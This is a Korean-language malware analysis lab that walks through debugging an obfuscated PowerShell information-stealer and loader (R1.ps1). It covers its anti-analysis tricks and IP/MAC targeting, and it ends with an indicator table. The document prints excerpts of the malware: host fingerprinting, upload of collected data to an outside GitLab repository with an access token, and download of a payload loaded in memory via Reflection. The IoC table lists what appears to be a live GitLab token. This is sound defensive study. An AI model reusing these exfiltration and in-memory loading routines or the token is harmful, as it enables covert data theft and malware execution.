## 실전 분석 - 정보수집형 스크립트

### Anti-Analysis 개요

Anti-Analysis는 스크립트의 분석을 방해하기 위해 공격자가 삽입하는 우회 기법을 의미한다.

| 기법 | 설명 |
|---|---|
| 정크코드 | 실행되어도 의미가 없는 코드를 삽입하여 분석가의 시선을 분산한다. |
| 데드코드 | 실제로 호출되지 않는 함수나 코드를 삽입하여 코드의 전체적인 볼륨을 증가시킨다. |
| 환경탐지 | IP, MAC, 도메인, CPU 등의 시스템 정보를 검사하여 분석 환경이나 특정 환경을 판별한다. |
| 표적조건 | 특정 조건을 만족할 때만 페이로드가 실행되도록 분기한다. |

### 실습 1 - 정크 코드와 ASCII 배열 확인

상단의 정크코드를 식별하고, ASCII 배열이 실행 시점에 문자열로 조립되는 과정을 콘솔에서 확인한다.

- 첫 대입 라인 다음 줄에 F9 중단점을 설정한 후 F5로 실행한다.
- 콘솔에 `$zD4`를 입력하여 `System.Drawing`이 출력되는 것을 확인한다. 이를 통해 ASCII 값이 문자열로 조립되는 과정을 확인한다.
- 콘솔에 `$zD2a`, `$zD2b`를 입력하여 각각 `127.`, `169.254.`가 출력되는 것을 확인한다. 이는 루프백 및 링크 로컬 주소를 제외하기 위한 프리픽스로 사용된다.
- `$zD5`, `$zD6`도 동일하게 어셈블리 이름이 실행 시점에 조립되는 것을 확인한다.

```bash
# 정크(1행) — GUID 길이는항상36, 절대False
$zD1 = [System.Guid]::NewGuid().ToString().Length; if ($zD1 -lt 0) { break };

# ASCII 배열로은닉된어셈블리이름(10~15행)
$zD4 = -join ((83,121,115,116,101,109,46,68,114,97,119,105,110,103) | %{ [char]$_ });
$zD5 = -join
((83,121,115,116,101,109,46,87,105,110,100,111,119,115,46,70,111,114,109,115) | %{ [char]$_ });

# ASCII 배열로은닉된IP 프리픽스(19행)
$zD2a = -join ((49,50,55,46) | %{ [char]$_ });         # → "127."
$zD2b = -join ((49,54,57,46,50,53,52,46) | %{ [char]$_ });  # → "169.254."
```

### 실습 2 - IP, MAC 수집 결과 확인

실제로 수집되는 IP와 MAC 값을 콘솔에서 직접 확인한다.

- 30행 다음 줄에 F9 중단점을 설정한 후 F5로 실행한다.
- 콘솔에 `$X2M6wyeeI3C9AlL3`을 입력하여 시스템에서 수집된 실제 IP 배열을 확인한다.
- 콘솔에 `$hKUmCjwdQiJE`를 입력하여 `AA-BB-CC-DD-EE-FF` 형식의 MAC 주소를 확인한다.
- 수집된 두 값은 이후 표적 여부를 판단하는 분기 조건에 사용된다.

```bash
# IP 수집— 루프백/링크로컬제외(19~21행)
$CTGhmyqg = Get-NetIPAddress -AddressFamily IPv4 |
  Where-Object { $_.IPAddress -notlike ($zD2a+'*') -and $_.IPAddress -notlike
($zD2b+'*') };
$X2M6wyeeI3C9AlL3 = ($CTGhmyqg | %{ $_.IPAddress });

# MAC 수집(29~30행) — 첫활성어댑터의MAC (콜론→대시, 대문자)
$hKUmCjwdQiJE = ($AlSl7lIrybX[0].MacAddress -replace ':', '-').ToUpper();
```

### 실습 3 - IP·MAC 분기 조건 이해

하드코딩된 IP·MAC 목록과 분기 조건이 어떻게 구성되어 있는지 확인한다.

이 스크립트는 표적 시스템의 목록을 스크립트 내부에 직접 하드코딩해 둔 것이 특징이다.

- `$zD12`에는 하드코딩된 IP 목록과 일치하는 IP가 저장된다.
- `$zD13`에는 MAC 주소가 하드코딩된 목록과 일치하는지에 대한 `True/False` 결과가 저장된다.
- 일반적인 분석 VM은 해당 목록에 포함되지 않으므로 그대로 실행하면 `else` 분기인 정보 수집 경로로 진입한다.

```bash
# 하드코딩IP 목록8개(36~43행)
$rnv08KO9OukgzGaC = @('192.168.121.1','192.168.124.57', ..., '192.168.31.208');

# 하드코딩MAC 목록36개(44~80행, 일부만표기)
$gekDAz1mOx = @('EA-E6-A6-A8-CD-0C', ..., '11-22-33-44-55-66', ...);

# 분기조건(81~83행)
$zD12 = ($X2M6wyeeI3C9AlL3 | Where-Object { $_ -in $rnv08KO9OukgzGaC });
$zD13 = $hKUmCjwdQiJE -in $gekDAz1mOx;
if ($zD12 -or $zD13) { <페이로드실행> } else { <정보수집> }
```

### 실습 4 — 미매칭 분기 관찰

분석 환경이 하드코딩된 표적 목록과 일치하지 않을 경우 진입하는 `else` 분기의 실행 흐름을 콘솔에서 관찰한다.

- `else` 분기 진입 직후인 약 158행에 F9 중단점을 설정한 후 F5로 실행한다.
- 콘솔에 `$PQ9yZgvI9i9`를 입력하여 `access_denied_[날짜]_[MAC]_[IP].txt` 형식으로 조립되는 파일명을 확인한다.
- 콘솔에 `$YTj9pOhios`를 입력하여 `PRIVATE-TOKEN`, `glpat-...`, `application/json`으로 구성되는 복호화된 HTTP 헤더 정보를 확인한다.
- 콘솔에 `$wzTH4i0K`를 입력하여 `ekek2-log-project/log2` 업로드 URL이 조립되는 과정을 확인한다.

```bash
# 파일명조립— ROT+4로은닉된날짜포맷(159~160행)
$T1EQqcXYIlt = Get-Date -Format ROT+4('uuuu-II-zz_DD-ii-oo');  # → 'yyyy-MM-dd_HH-mm-ss'
$PQ9yZgvI9i9 = 'access_denied_' + $T1EQqcXYIlt + '_' + $hKUmCjwdQiJE + '_' + $X2M6wyeeI3C9AlL3[0] + '.txt';

# 헤더— 이름ROT+2, PAT ROT+15, Content-Type ROT+21 (176~179행)
$YTj9pOhios = @{ 'NPGTYRC-RMICL' = 'rwale-AH4Mn_...'; 'Content-Type' = 'fuuqnhfynts/oxts' };

$c2jO2xnE = Invoke-RestMethod -Uri $wzTH4i0K -Method Post -Headers $YTj9pOhios -Body $gyepDI9gM8FDsF;
```

### 실습 5 - 매칭 분기 재현 (`$zD12/$zD13 = 1`)

매칭 결과 변수를 강제로 참으로 설정하여 페이로드 실행 분기를 분석 환경에서 재현한다.

- 분기 조건인 `if ($zD12 -or $zD13)`이 있는 약 83행에 F9 중단점을 설정한다.
- 실행이 중단되면 콘솔에서 `$zD12`, `$zD13`에 `1`을 강제로 대입한다.
- F5로 실행을 계속하여 `if` 분기인 페이로드 실행 경로로 진입한다.
- 콘솔에 `$WExDv4kp7osLsU`를 입력하여 조립된 `jka.beep` 다운로드 GitLab URL을 확인한다.
- 콘솔에 `$PRASFee8`을 입력하여 ROT+3으로 복호화된 GitLab PAT인 `glpat-PW4Bc_...`를 확인한다.
- 콘솔에 `$d5`를 입력하여 분할 조립된 `PRIVATE-TOKEN` 헤더명을 확인한다.

```bash
# 콘솔에서강제대입
$zD12 = 1
$zD13 = 1
```

### 실습 6 — 다운로드 실패 확인과 이후 코드 리딩

실습 환경에서는 인터넷 연결이 차단되어 있으므로 다운로드 단계에서 `exit 1`로 종료된다. 따라서 이후의 페이로드 실행 흐름은 코드 리딩을 통해 분석한다.

- F10으로 약 95행까지 진행하여 `Invoke-WebRequest`가 인터넷 연결 차단으로 실패하고, `catch` 블록에서 `exit 1`로 종료되는 것을 확인한다.
- 101행에서는 수신된 바이트의 앞 8바이트를 GZip 매직 바이트(`0x1F, 0x8B, 0x08, ...`)로 덮어쓴다.
- 104행에서는 `fA1x` 함수를 이용하여 GZip 압축을 해제하고 원본 .NET 어셈블리 바이트를 복원한다.
- 111~116행에서는 Reflection의 `Assembly.Load`를 이용하여 어셈블리를 메모리에 로드한 후 `EntryPoint`를 호출하는 흐름으로 이어진다.
- `EntryPoint`가 `null`인 경우에는 `catch`에서 `Main` 메서드를 찾아 실행하는 fallback 경로가 준비되어 있음을 확인한다.

```bash
# 다운로드(95행)
[byte[]] $wVFoFfGj1XVE = (Invoke-WebRequest -Uri $WExDv4kp7osLsU -Headers $WLnrra22ECvZ67 -UseBasicParsing).Content;

# GZip 매직바이트강제복원+ 압축해제(101, 104행)
$d8 = 0x1F,0x8B,0x08,0x00,0x00,0x00,0x00,0x00; for ($i = 0; $i -lt 8; $i++) { $wVFoFfGj1XVE[$i] = $d8[$i] };
[byte[]] $fHHnYsS6DLgWhJ = fA1x -KbPzU64OUdw $wVFoFfGj1XVE;

# Reflection Assembly.Load → EntryPoint Invoke (111~116행, 문자열은ASCII 은닉)
$u9Q = [System.Reflection.Assembly].Assembly.GetType(<ASCII 'System.Reflection.Assembly'>);
$d11 = $u9Q.GetMethod(<ASCII 'Load'>, [type[]]@([byte[]])); $lJsEMNPpj8osh9DU = $d11.Invoke($null, @(,$fHHnYsS6DLgWhJ));
$yAUhUWm2 = $lJsEMNPpj8osh9DU.GetType().GetProperty(<ASCII 'EntryPoint'>).GetValue($lJsEMNPpj8osh9DU, $null);
```

### 실습 7 — IoC 정리

R1.ps1 분석을 통해 확보한 IoC(Indicator of Compromise)를 정리한다.

| 종류 | 값 |
|---|---|
| 페이로드 URL | `gitlab.com/api/v4/projects/ekek2-group%2Fekek2-project/repository/files/jka.beep/raw?ref=main` |
| 로그 업로드 URL | `gitlab.com/api/v4/projects/ekek2-log-project/repository/files/log2%2F...` |
| 페이로드 PAT | `glpat-PW4Bc_bnugNaMzPTxJYqPG86MQp1Omlma3UxCw.01.121ue0rjl` (ROT+3) |
| 페이로드 파일 | `jka.beep` — GZip 압축된 .NET 어셈블리 |
| 표적 IP·MAC | IP 목록 8개 + MAC 목록 36개가 하드코딩되어 있다. |

### 요약

- R1.ps1은 정크코드, 데드코드, 환경탐지, 표적조건분기 등의 Anti-Analysis 기법을 활용하는 정보수집형 악성 스크립트이다.
- IP·MAC 주소가 하드코딩된 목록에 포함되면 페이로드 실행 경로로 진입하고, 포함되지 않으면 `access_denied_*.txt` 형식의 로그를 별도 GitLab 저장소로 업로드하는 정보수집 경로로 진입한다.
- 매칭 분기의 페이로드 흐름은 GitLab에서 파일을 다운로드하고, GZip 헤더를 복원한 뒤 압축을 해제하고, Reflection의 `Assembly.Load`를 이용하여 .NET 어셈블리를 메모리에 로드한 후 `EntryPoint`를 호출하는 순서로 구성된다.
- 문자열 은닉에는 ASCII 배열을 `-join`으로 조립하는 방식과 여러 ROT 시프트(`ROT+2`, `+3`, `+4`, `+12`, `+15`, `+16`, `+21`)가 혼합되어 사용된다. 따라서 정적 문자열만 확인하기보다 디버거의 중단점에서 실행 시점의 변수 값을 확인하는 것이 분석에 유용하다.
- 분석 과정에서는 `$zD12`, `$zD13`과 같은 매칭 결과 변수를 확인하여 표적 조건 분기가 어떻게 동작하는지 검증할 수 있다.
